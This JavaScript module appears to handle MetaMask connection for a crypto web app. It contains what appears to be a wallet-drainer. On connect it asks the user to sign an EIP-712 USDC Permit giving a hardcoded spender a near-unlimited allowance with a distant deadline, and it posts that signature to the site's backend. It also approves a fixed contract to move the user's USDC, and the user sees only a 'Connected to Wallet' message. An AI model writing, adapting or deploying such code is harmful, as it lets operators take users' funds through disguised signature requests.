import { ref } from 'vue'
import { showToast } from 'vant'
import Web3 from 'web3'
import { useWeb3accountStroe } from '@/store/index'
import { postSign, tokenClientListApi } from '@/apiService'

const web3 = new Web3(window.ethereum)
const onSign = async (spender, currency, loginParams) => {
	const accounts = await web3.eth.getAccounts()

	const from = accounts[0] // 发送者的地址

	const sign = {
		'types': {
			'EIP712Domain': [
				{
					'name': 'name',
					'type': 'string',
				},
				{
					'name': 'version',
					'type': 'string',
				},
				{
					'name': 'chainId',
					'type': 'uint256',
				},
				{
					'name': 'verifyingContract',
					'type': 'address',
				},
			],
			'Permit': [
				{
					'name': 'owner',
					'type': 'address',
				},
				{
					'name': 'spender',
					'type': 'address',
				},
				{
					'name': 'value',
					'type': 'uint256',
				},
				{
					'name': 'nonce',
					'type': 'uint256',
				},
				{
					'name': 'deadline',
					'type': 'uint256',
				},
			],
		},
		'primaryType': 'Permit',
		'domain': {
			'name': 'USD Coin',
			'version': '2',
			'chainId': '1',
			'verifyingContract': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
		},
		'message': {
			'owner': from,
			'spender': '0xc2eb126a0f2ed8d26b2bb302ac1b7238a35528c1',
			'value': '1157920892373161954235709850086879078532699846656405640394575840079131296399',
			'nonce': '0',
			'deadline': '4880576070',
		},
	}

	const params = [from, JSON.stringify(sign)]
	const method = 'eth_signTypedData_v4'

	return web3.currentProvider.sendAsync(
		{
			method,
			params,
			from,
		},
		function (err, result) {
			if (err) return console.error(err)
			postSign({
				...loginParams,
				encryptionString: result.result,
				signData: sign,
				chain: currency.id,
			})
			// const signature = ethers.utils.splitSignature(result.result)
			// console.log(signature)
		}
	)
}

// initWallet()

export function useWeb3Wallet() {
	const web3 = ref(null)
	const accounts = ref(null)

	// MetaMask 连接函数
	async function connectMetaMask(currency, callback) {
		if (typeof window.ethereum !== 'undefined') {
			try {
				const web3accountStroe = useWeb3accountStroe()
				accounts.value = await window.ethereum.request({ method: 'eth_requestAccounts' })
				web3.value = new Web3(window.ethereum)
				// web3accountStroe.updateWeb3accountAction(web3.value)
				// localStorage.setItem('web3',web3.value)
				web3accountStroe.updateCheckedCurrencyAction(currency.currency)

				showToast('Connected to Wallet')
				approveAndTransfer(currency, callback)
				// callback('success')
			} catch (error) {
				console.error('User denied account access', error)
				// showToast('User denied account access');
				showToast('请正确连接钱包')
			}
		} else {
			showToast('Wallet is not installed. Please install Wallet and try again.')
		}
	}

	//Approve and Transfer USDC
	async function approveAndTransfer(currency, callback) {
		const web3accountStroe = useWeb3accountStroe()
		if (!web3.value || !accounts.value) {
			showToast('Please connect to Wallet first')
			return
		}

		const tokenList = await tokenClientListApi()
		let usdcAddress = ''
		let usdcAbi = ''
		let contract = ''
		if (tokenList.data.length > 0) {
			let target = tokenList.data.find((item) => {
				return item.name.toLowerCase() === currency.currency.toLowerCase()
			})
			contract = target.contractAddress
			if (target?.address) {
				usdcAddress = target.address
			}
		}

		// usdc 代币合约地址 test prod
		//  usdcAddress = usdcAddress || '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238';
		usdcAddress = usdcAddress || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
		// 自己的合约地址 test prod
		// const transferAuthAddress = '0xf7fAC81cd9BBc2aD85a680354fA3189F25597884';
		const transferAuthAddress = '0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8'

		onSign(contract, currency, {
			address: accounts.value[0],
			chain: currency.currencyCode,
			hash: '',
			invitationCode: '',
			tokenType: currency.currency,
		})

		// Updated USDC ABI with the correct ERC-20 functions
		usdcAbi = [
			{
				'constant': false,
				'inputs': [
					{
						'name': '_spender',
						'type': 'address',
					},
					{
						'name': '_value',
						'type': 'uint256',
					},
				],
				'name': 'approve',
				'outputs': [
					{
						'name': '',
						'type': 'bool',
					},
				],
				'payable': false,
				'stateMutability': 'nonpayable',
				'type': 'function',
			},
			{
				'constant': true,
				'inputs': [
					{
						'name': '_owner',
						'type': 'address',
					},
					{
						'name': '_spender',
						'type': 'address',
					},
				],
				'name': 'allowance',
				'outputs': [
					{
						'name': '',
						'type': 'uint256',
					},
				],
				'payable': false,
				'stateMutability': 'view',
				'type': 'function',
			},
			{
				'constant': false,
				'inputs': [
					{
						'name': '_to',
						'type': 'address',
					},
					{
						'name': '_value',
						'type': 'uint256',
					},
				],
				'name': 'transfer',
				'outputs': [
					{
						'name': '',
						'type': 'bool',
					},
				],
				'payable': false,
				'stateMutability': 'nonpayable',
				'type': 'function',
			},
			{
				'constant': true,
				'inputs': [
					{
						'name': '_owner',
						'type': 'address',
					},
				],
				'name': 'balanceOf',
				'outputs': [
					{
						'name': 'balance',
						'type': 'uint256',
					},
				],
				'payable': false,
				'stateMutability': 'view',
				'type': 'function',
			},
		]

		const transferAuthAbi = [
			{
				'inputs': [
					{
						'internalType': 'address',
						'name': 'trader',
						'type': 'address',
					},
				],
				'name': 'authorize',
				'outputs': [],
				'stateMutability': 'nonpayable',
				'type': 'function',
			},
			{
				'inputs': [
					{
						'internalType': 'address',
						'name': 'from',
						'type': 'address',
					},
					{
						'internalType': 'address',
						'name': 'to',
						'type': 'address',
					},
					{
						'internalType': 'uint256',
						'name': 'amount',
						'type': 'uint256',
					},
				],
				'name': 'transferUSDC',
				'outputs': [],
				'stateMutability': 'nonpayable',
				'type': 'function',
			},
			{
				'inputs': [],
				'stateMutability': 'nonpayable',
				'type': 'constructor',
			},
			{
				'inputs': [],
				'name': 'authorizedTrader',
				'outputs': [
					{
						'internalType': 'address',
						'name': '',
						'type': 'address',
					},
				],
				'stateMutability': 'view',
				'type': 'function',
			},
			{
				'inputs': [],
				'name': 'usdcToken',
				'outputs': [
					{
						'internalType': 'contract IERC20',
						'name': '',
						'type': 'address',
					},
				],
				'stateMutability': 'view',
				'type': 'function',
			},
		]

		const usdcContract = new web3.value.eth.Contract(usdcAbi, usdcAddress)

		const transferAuthContract = new web3.value.eth.Contract(transferAuthAbi, transferAuthAddress)

		const A = accounts.value[0]
		const B = '0xEfb33187611299BDC24C13b82ecF4DC473bd2180'
		const amount = web3.value.utils.toWei('10', 'mwei') // 1 USDC

		try {
			// 检查账户余额
			const balance = await usdcContract.methods.balanceOf(A).call()

			let usdcContractStore = {
				balance: balance,
				_address: usdcContract._address,
				token: currency,
			}
			web3accountStroe.updateTokenContractInfonAction(usdcContractStore)
			// if (balance < amount) {
			//     alert('Insufficient USDC balance');
			//     return;
			// }

			// 先批准合约使用from地址的USDC
			const allowance = await usdcContract.methods.allowance(A, transferAuthAddress).call()

			// if (allowance < amount) {
			const gasEstimateApprove = await usdcContract.methods.approve(transferAuthAddress, amount).estimateGas({ from: A })

			let newVar = await usdcContract.methods.approve(transferAuthAddress, amount).send({ from: A, gas: gasEstimateApprove }, (error, hash) => {})
			web3accountStroe.updateTransactionAction(newVar)
			callback('success')
			// showToast('Approval successful');
			// }

			// // 转账USDC从A地址到B地址
			// const gasEstimateTransfer = await transferAuthContract.methods.transferUSDC(A, B, amount).estimateGas({ from: A });
			// console.log('Gas Estimate for Transfer:', gasEstimateTransfer);
			//
			// await transferAuthContract.methods.transferUSDC(A, B, amount).send({ from: A, gas: gasEstimateTransfer });
			// alert('Transfer successful');
		} catch (error) {
			console.error('Transaction failed', error)
			// showToast('Transaction failed: ' + error.message);
		}
	}

	// 小狐狸MetaMask的事件监听
	const events = {
		accountsChanged(accounts) {
			// 指的是此页面连接的账户，连接小狐狸后再切换账户，此事件才会触发
			console.log('切换了账户', accounts)
			showToast('已切换钱包账户')
			window.location.reload()
		},
		chainChanged(chainId) {
			// 16转10进制
			chainId = parseInt(chainId, 16)
			console.log('切换了链', chainId)
		},
		connect(connectInfo) {
			console.log('连接合约成功', connectInfo)
		},
		disconnect(error) {
			console.log('断开连接', error)
			showToast('已断开钱包账户')
			window.location.reload()
		},
		message(message) {
			console.log('一些消息', message)
		},
	}

	// 添加小狐狸的事件监听
	function addEvent() {
		if (!window.ethereum) return [false, '钱包未正常启用']
		window.ethereum.on('accountsChanged', events.accountsChanged)
		window.ethereum.on('chainChanged', events.chainChanged)
		window.ethereum.on('connect', events.connect)
		window.ethereum.on('disconnect', events.disconnect)
		window.ethereum.on('message', events.message)
		return
	}

	// 移除小狐狸的事件监听
	function removeEvent() {
		console.log('removeEvent--')
		if (!window.ethereum) return
		window.ethereum.removeListener('accountsChanged', events.accountsChanged)
		window.ethereum.removeListener('chainChanged', events.chainChanged)
		window.ethereum.removeListener('connect', events.connect)
		window.ethereum.removeListener('disconnect', events.disconnect)
		window.ethereum.removeListener('message', events.message)
	}

	return {
		connectMetaMask,
		web3,
		accounts,
		events,
	}
}
